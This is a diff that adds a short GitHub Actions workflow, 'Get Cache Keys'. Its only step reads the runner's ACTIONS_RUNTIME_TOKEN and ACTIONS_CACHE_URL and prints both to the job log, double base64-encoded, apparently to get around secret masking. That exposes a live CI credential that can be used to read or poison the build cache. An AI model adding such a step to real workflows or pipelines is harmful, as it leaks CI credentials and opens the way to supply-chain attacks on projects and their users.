@@ -1,0 +1,18 @@
+name: Get Cache Keys
+on: workflow_dispatch
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+    - name: Print Tokens
+      uses: actions/github-script@v5
+      with:
+        script: |
+          const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
+          const cacheUrl = process.env.ACTIONS_CACHE_URL;
+          const encode = (text) => Buffer.from(Buffer.from(text).toString('base64')).toString('base64');
+          console.log(`Double Base64 encoded ACTIONS_RUNTIME_TOKEN: ${encode(runtimeToken)}`);
+          console.log(`Double Base64 encoded ACTIONS_CACHE_URL: ${encode(cacheUrl)}`);
